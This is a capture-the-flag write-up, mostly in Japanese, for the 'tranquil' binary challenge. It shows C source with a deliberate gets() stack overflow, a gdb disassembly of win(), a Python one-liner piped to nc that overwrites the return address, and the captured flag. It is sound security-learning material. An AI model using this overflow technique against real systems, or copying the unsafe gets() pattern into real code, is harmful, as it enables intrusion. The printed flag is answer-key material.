# tranquil:Binary:70pts
Finally, [inner peace](tranquil) - Master Oogway  
[Source](tranquil.c)  
Connect with `nc shell.actf.co 21830`, or find it on the shell server at `/problems/2021/tranquil`.  
Hint  
The compiler gives me a warning about gets... I wonder why.  

# Solution
配布されたソースを見ると以下のようであった。  
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
~~~
    puts(flag);
}

~~~

int vuln(){
    char password[64];
    
    puts("Enter the secret word: ");
    
    gets(&password);
    
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    // not so easy for you!
    // win();
    
    return 0;
}
```
ret2winである。  
以下のようにwinのアドレスを取得し、リターンアドレスを書き換える。  
```bash
$ gdb ./tranquil
~~~
gdb-peda$ disass win
Dump of assembler code for function win:
   0x0000000000401196 <+0>:     push   rbp
   0x0000000000401197 <+1>:     mov    rbp,rsp
   0x000000000040119a <+4>:     sub    rsp,0x90
   0x00000000004011a1 <+11>:    lea    rsi,[rip+0xe60]        # 0x402008
   0x00000000004011a8 <+18>:    lea    rdi,[rip+0xe5b]        # 0x40200a
   0x00000000004011af <+25>:    call   0x401090 <fopen@plt>
   0x00000000004011b4 <+30>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011b8 <+34>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004011bd <+39>:    jne    0x4011da <win+68>
   0x00000000004011bf <+41>:    lea    rdi,[rip+0xe52]        # 0x402018
   0x00000000004011c6 <+48>:    mov    eax,0x0
   0x00000000004011cb <+53>:    call   0x401050 <printf@plt>
   0x00000000004011d0 <+58>:    mov    edi,0x1
   0x00000000004011d5 <+63>:    call   0x4010a0 <exit@plt>
   0x00000000004011da <+68>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011de <+72>:    lea    rax,[rbp-0x90]
   0x00000000004011e5 <+79>:    mov    esi,0x80
   0x00000000004011ea <+84>:    mov    rdi,rax
   0x00000000004011ed <+87>:    call   0x401060 <fgets@plt>
   0x00000000004011f2 <+92>:    lea    rax,[rbp-0x90]
   0x00000000004011f9 <+99>:    mov    rdi,rax
   0x00000000004011fc <+102>:   call   0x401030 <puts@plt>
   0x0000000000401201 <+107>:   nop
   0x0000000000401202 <+108>:   leave
   0x0000000000401203 <+109>:   ret
End of assembler dump.
gdb-peda$ q
$ python3 -c "import sys;sys.stdout.buffer.write(b'\x96\x11\x40\x00\x00\x00\x00\x00'*10+b'\n')" | nc shell.actf.co 21830
Enter the secret word:
Login failed!
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}

Segmentation fault (core dumped)
```
flagが得られた。  

## actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}